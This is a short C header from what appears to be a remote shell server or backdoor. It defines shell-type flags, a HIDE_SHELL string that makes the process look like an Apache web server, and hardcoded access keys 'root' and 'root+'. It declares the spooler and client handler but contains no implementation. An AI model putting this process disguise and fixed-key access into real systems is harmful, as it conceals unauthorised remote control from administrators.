/*
 *  Copyright (C) 2004  Christophe Devine
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#ifndef __mrm_server_h__
#define __mrm_server_h__

#define MAX_SHELLS         16
#define GET_RAW_SHELL   0x100
#define GET_PTY_SHELL   0x200

#define HIDE_SHELL      "/usr/sbin/apache2 -k start"
#define ROOT_KEY        "root"
#define ROOT_KEY2       "root+"

void shell_spooler(void);
void process_client(int get_type, int client_fd);

#endif
